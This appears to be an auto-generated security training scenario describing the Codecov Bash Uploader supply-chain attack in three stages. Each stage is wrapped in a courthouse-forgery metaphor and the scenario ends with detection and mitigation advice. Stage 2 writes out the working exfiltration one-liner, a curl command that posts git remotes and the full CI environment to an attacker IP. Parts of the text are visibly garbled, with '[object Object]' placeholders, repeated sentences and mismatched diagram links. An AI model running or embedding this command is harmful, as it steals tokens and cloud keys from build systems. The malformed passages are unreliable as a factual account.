scenario.name: Codecov Bash Uploader CI/CD Environment Variable Exfiltration
scenario.overview: Imagine a grand city courthouse hall with fluted marble columns, an elevated wooden judge bench, a witness stand, and a brass wax-seal notary stamping desk. Entering the marble courthouse hall during a crowded docket, a forger requests a routine certified copy at the notary clerk’s brass stamping counter. In this real-world scenario, the intruder bypasses the normal inspection rule to reach the brass courthouse wax-seal press, then quietly copies a trusted access pass from the court notary clerk's station. The court bailiff audits the official notary stamp registry and discovers stamped certificates that were never entered into the judge’s docket book. In this scenario (T1195.002, Codecov Bash Uploader CI/CD Environment Variable Exfiltration), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: gCS Bucket Tampering of Hosted codecov.sh, then unverified curl | bash Execution, then downstream Private Git Repository Cloning. Steps #1–#3 walk that chain end-to-end by covering GCS Bucket Tampering of Hosted codecov.sh, then Unverified curl | bash Execution, then Downstream Private Git Repository Cloning, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.

stages.title: Stage 1: GCS Bucket Tampering of Hosted codecov.sh Uploader
stages.subtitle: Initial Access (T1195.002 - Compromise Software Supply Chain)
stages.description: Entering the marble courthouse hall during a crowded docket, a forger requests a routine certified copy at the notary clerk’s brass stamping counter. Specifically in Step 1, the intruder bypasses the normal inspection rule to reach the brass courthouse wax-seal press while everyday visitors and the court notary clerk go about their routine. By extracting a residual Google Cloud Storage (GCS) service account credential from a Codecov Docker image layer, the threat actor gained write access to the GCS bucket hosting https://codecov.io/bash and modified line 522 (injecting a one-line curl exfiltration command while leaving all coverage-reporting functionality intact so customer builds continued passing). The tampering remained undetected until a security-conscious customer verified the downloaded script against the published SHA-256 checksum in Codecov’s GitHub repository and noticed the hash mismatch. In the documented Auth exchange from Attacker Collector (178.62.86.114) to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK T1195.002 (confirming that the Stage 1: GCS Bucket Tampering of Hosted codecov.sh Uploader request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: Unverified curl | bash Execution & CI Environment Harvesting). On the diagram, follow Step #1 / Link #1 (#1→ Stage 1: GCS Bucket Tampering of Hosted codecov.sh Uploader / ⇠#1 ACK T1195.002) from Node ① (#1 Attacker Collector (178.62.86.114)) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Private Git Repos & Cloud Production Keys).

stages.title: Stage 2: Unverified curl | bash Execution & CI Environment Harvesting
stages.subtitle: Collection (T1005 - Data from Local System)
stages.description: Taking advantage of an unguarded moment at the notary desk, the forger lifts the impression of the courthouse wax seal and stamps a stack of unauthorized passes offline. Here in Step 2 inside the courthouse, the intruder quietly copies a trusted access pass from the court notary clerk's station without disturbing the sealed judicial record vault. When customer CI pipelines executed bash <(curl -s https://codecov.io/bash) (the curl | bash anti-pattern that streams remote code directly into a live shell interpreter without prior hash verification), the shell evaluated curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://178.62.86.114/upload/v2 || true (using a 500-millisecond timeout -m 0.5 and || true so even if the attacker server was unreachable, the CI job would still exit 0 without alerting developers). $(git remote -v) captured the repository URL (often containing embedded OAuth tokens like https://x-access-token:ghp_...@github.com/...), and $(env) dumped every environment variable exported into the CI runner (AWS_SECRET_ACCESS_KEY, DATABASE_URL, NPM_TOKEN, GPG keys). Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage's output now drives the next action). On the diagram, follow Step #2 / Link #2 (#2→ curl -sm 0.5 -d "origin https://github.com/corp/payments.git (fetch)<<<<<< ENV AWS_SECRET_ACCESS_KEY=..." http://178.62.86.114/upload/v2 / ⇠#2 ALERT 1) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 Codecov GCS Bucket (codecov.io/bash)), monitored by Node ⑥ (#6 Private Git Repos & Cloud Production Keys).

keySpecs.value: Restrict outbound CI runner network egress to an explicit domain allowlist so arbitrary raw IP connections (such as 178.62.86.114) are blocked and logged.

stages.title: Stage 3: Downstream Private Git Repository Cloning & Signing Key Abuse
stages.subtitle: Lateral Movement (T1078.004 - Cloud Accounts)
stages.description: Every forged document now bears the court’s own authentic wax emblem, letting the holder command authority in any neighboring municipal hall. In this final step inside the courthouse, the intruder quietly copies a trusted access pass from the court notary clerk's station until the court bailiff stamp registry catches the mismatch. Using the harvested CI environment variables (GITHUB_TOKEN, personal access tokens, and cloud service credentials), the threat actor systematically authenticated to victim GitHub Enterprise and cloud tenants from external VPS infrastructure (104.248.94.23, cloning private source code repositories to search for hardcoded secrets and customer signing keys). Several high-profile software vendors had their private repositories cloned or GPG signing keys exposed through the CI environment dump, requiring enterprise-wide secret and certificate rotation. In the documented Auth exchange from Codecov GCS Bucket (codecov.io/bash) to Enterprise CI Runner (curl | bash), Enterprise CI Runner (curl | bash) responds with ACK T1078.004 (confirming that the Stage 3: Downstream Private Git Repository Cloning & Signing Key Abuse request succeeded on Enterprise CI Runner (curl | bash) and completing the final execution objective of Codecov Bash Uploader CI/CD Environment Variable Exfiltration). On the diagram, follow Step #3 / Link #3 (#3→ Stage 3: Downstream Private Git Repository Cloning & Signing Key Abuse / ⇠#3 ACK T1078.004) from Node ③ (#3 Codecov GCS Bucket (codecov.io/bash)) to Node ④ (#4 Enterprise CI Runner (curl | bash)), monitored by Node ⑥ (#6 Private Git Repos & Cloud Production Keys).

keySpecs.value: Scope CI tokens to minimum repository permissions, avoid storing long-lived signing keys in global CI environment variables, and audit unexpected git clone events from non-runner ASNs.
